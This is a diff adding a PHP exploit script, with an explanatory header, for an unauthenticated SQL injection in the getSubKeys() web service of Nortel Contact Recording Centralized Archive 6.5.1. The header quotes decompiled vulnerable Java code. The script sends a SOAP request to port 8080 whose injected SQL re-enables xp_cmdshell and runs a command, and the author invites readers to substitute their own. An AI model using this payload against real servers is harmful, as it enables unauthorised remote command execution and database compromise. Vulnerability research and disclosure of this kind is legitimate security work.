@@ -1,0 +1,249 @@
+<?php
+/*
+Nortel Contact Recording Centralized Archive 6.5.1 EyrAPIConfiguration 
+Web Service getSubKeys() Remote SQL Injection Exploit
+
+tested against:
+Microsoft Windows Server 2003 r2 sp2
+Microsoft SQL Server 2005 Express
+
+download uri:
+ftp://ftp.avaya.com/incoming/Up1cku9/tsoweb/web1/software/c/contactcenter/crqm/6_5_CS1K_2/Nortel-DVD3-Archive-6_5.iso
+
+background:
+
+This software installs a Tomcat http server which listens on
+port 8080 for incoming connections. It exposes the
+following servlet as declared inside
+c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\web.xml :
+
+...
+   <servlet-mapping>
+      <servlet-name>EyrAPIConfiguration</servlet-name>
+      <url-pattern>/EyrAPIConfiguration/*</url-pattern>
+   </servlet-mapping>
+...
+
+at the following url:
+
+http://[host]:8080/EyrAPI/EyrAPIConfiguration/EyrAPIConfigurationIf
+
+
+Vulnerability:
+
+without prior authentication, you can reach a web service
+with various methods availiable, as described inside
+the associated wsdl, see file:
+
+c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\classes\EyrAPIConfiguration.wsdl 
+
+among them, the getSubKeys() method.
+
+Now look at getSubKeys() inside the decompiled
+c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\classes\com\eyretel\eyrapi\EyrAPIConfigurationImpl.class
+
+:
+...
+ public String getSubKeys(boolean iterateSubKeys, boolean includeValues, String systemId, String componentId, String sysCompId, String userName)
+        throws RemoteException
+    {
+        StringBuffer xml;
+        ConfigOwnerId configOwnerId;
+        Connection conn;
+        PreparedStatement pStmt;
+        ResultSet rs;
+        PreparedStatement pStmt2;
+        ResultSet rs2;
+        log.info((new StringBuilder()).append("Request getSubKeys: iterateSubKeys=").append(iterateSubKeys).append(", includeValues=").append(includeValues).append(", SystemId=").append(systemId).append(", componentId=").append(componentId).append(", sysCompId=").append(sysCompId).append(", userName=").append(userName).toString());
+        xml = new StringBuffer("<ConfigurationNodeList>");
+        configOwnerId = null;
+        conn = null;
+        pStmt = null;
+        rs = null;
+        pStmt2 = null;
+        rs2 = null;
+        try
+        {
+            conn = SiteDatabase.getInstance().getConnection();
+            if(EyrAPIProperties.getInstance().getProperty("database", "MSSQLServer").equalsIgnoreCase("Oracle"))
+            {
+                if(componentId.compareToIgnoreCase("") == 0)
+                    componentId = "*";
+                if(systemId.compareToIgnoreCase("") == 0)
+                    systemId = "*";
+                if(sysCompId.compareToIgnoreCase("") == 0)
+                    sysCompId = "*";
+                if(userName.compareToIgnoreCase("") == 0)
+                    userName = "*";
+                pStmt = conn.prepareStatement((new StringBuilder()).append("SELECT ConfigOwnerID FROM ConfigOwnerView WHERE nvl(ComponentID, '*') = '").append(componentId).append("' AND ").append("nvl(SystemID, '*') = '").append(systemId).append("' AND ").append("nvl(SysCompID, '*') = '").append(sysCompId).append("' AND ").append("nvl(UserName, '*') = '").append(userName).append("'").toString());
+                rs = pStmt.executeQuery();
+            } else
+            {
+                pStmt = conn.prepareStatement((new StringBuilder()).append("SELECT ConfigOwnerID FROM ConfigOwnerView WHERE ISNULL(CONVERT(varchar(36), ComponentID), '') = '").append(unpunctuate(componentId)).append("' AND ").append("ISNULL(CONVERT(varchar(36), SystemID), '') = '").append(unpunctuate(systemId)).append("' AND ").append("ISNULL(CONVERT(varchar(36), SysCompID), '') = '").append(unpunctuate(sysCompId)).append("' AND ").append("ISNULL(UserName, '') = '").append(unpunctuate(userName)).append("'").toString());
+                rs = pStmt.executeQuery();
+            }
+            if(rs.next())
+            {
+                String strConfigOwnerId = rs.getString(1);
+                if(!rs.wasNull())
+                    configOwnerId = new ConfigOwnerId(strConfigOwnerId);
+                pStmt2 = conn.prepareStatement((new StringBuilder()).append("SELECT ConfigGroupID, ConfigGroupName FROM ConfigGroupView WHERE ConfigOwnerID = '").append(configOwnerId.toString()).append("'").toString());
+                for(rs2 = pStmt2.executeQuery(); rs2.next(); xml.append(getSubKeyValuesInc(new Integer(rs2.getInt(1)), iterateSubKeys, includeValues)));
+            }
+        }
+        catch(SQLException e)
+        {
+            String msg = "Unable to get subkeys";
+            log.error(msg, e);
+            throw new RemoteException(msg, e);
+        }
+        catch(GenericDatabaseException e)
+        {
+            String msg = "Unable to get subkeys";
+            log.error(msg, e);
+            throw new RemoteException(msg, e);
+        }
+        DbHelper.closeStatement(log, pStmt);
+        DbHelper.closeResultSet(log, rs);
+        DbHelper.closeStatement(log, pStmt2);
+        DbHelper.closeResultSet(log, rs2);
+        DbHelper.closeConnection(log, conn);
+        break MISSING_BLOCK_LABEL_646;
+        Exception exception;
+        exception;
+        DbHelper.closeStatement(log, pStmt);
+        DbHelper.closeResultSet(log, rs);
+        DbHelper.closeStatement(log, pStmt2);
+        DbHelper.closeResultSet(log, rs2);
+        DbHelper.closeConnection(log, conn);
+        throw exception;
+        xml.append("\n</ConfigurationNodeList>");
+        log.info((new StringBuilder()).append("Response createKey= ").append(xml).toString());
+        return xml.toString();
+    }
+...
+
+This function uses unproperly the prepareStatement() function, a SELECT query is concatenated
+inside of it and using user supplied values.
+
+Note also that the unpunctuate() function is unuseful to clean the passed values:
+
+...
+protected String unpunctuate(String id)
+    {
+        StringBuffer sb = new StringBuffer(id);
+        try
+        {
+            if(sb.charAt(0) == '{')
+                sb.deleteCharAt(0);
+        }
+        catch(StringIndexOutOfBoundsException e) { }
+        try
+        {
+            if(sb.charAt(36) == '}')
+                sb.deleteCharAt(36);
+        }
+        catch(StringIndexOutOfBoundsException e) { }
+        return sb.toString();
+    }
+...
+
+As result, a remote attacker can send a SOAP message against port 8080 containing the 
+getSubKeys string to execute arbitrary sql commands against the 
+underlying database.
+
+The following code tries to execute calc.exe (if the xp_cmdshell stored procedure
+is not enabled, it will try to reenable it via 'sp_configure', assuming you have
+the privileges of the 'sa' user), otherwise use your imagination.
+
+Note: Reportedly, this product is end of sale ... so it's better you are aware of
+it just in case you have an online installation exposed to user input :)
+
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_nortel.php [ip_address]\r\n" );
+       die();
+    }
+    
+	$argv[1] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: ".$ck ,
+            "Content-Type: text/xml"
+            
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "");
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 8080;
+
+print("[*] Check for spawned calc.exe sub process.\n");
+$sql="'; ".
+     "EXEC sp_configure 'show advanced options',1;RECONFIGURE;".
+     "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;".
+     "EXEC xp_cmdshell 'calc';--";
+$soap='<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdl="http://com.eyretel.eyrapi.org/wsdl">
+   <soapenv:Header/>
+   <soapenv:Body>
+      <wsdl:getSubKeys soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+         <boolean_1 xsi:type="xsd:boolean">true</boolean_1>
+         <boolean_2 xsi:type="xsd:boolean">true</boolean_2>
+         <String_3 xsi:type="xsd:string">'.$sql.'</String_3>
+         <String_4 xsi:type="xsd:string">yyyy</String_4>
+         <String_5 xsi:type="xsd:string">zzzz</String_5>
+         <String_6 xsi:type="xsd:string">kkkk</String_6>
+      </wsdl:getSubKeys>
+   </soapenv:Body>
+</soapenv:Envelope>';
+$url = "http://$host:$port/EyrAPI/EyrAPIConfiguration/EyrAPIConfigurationIf";
+$out = _s($url, 1, "", $soap);
+print($out."\n");
+print("[*] Done.");
+?>
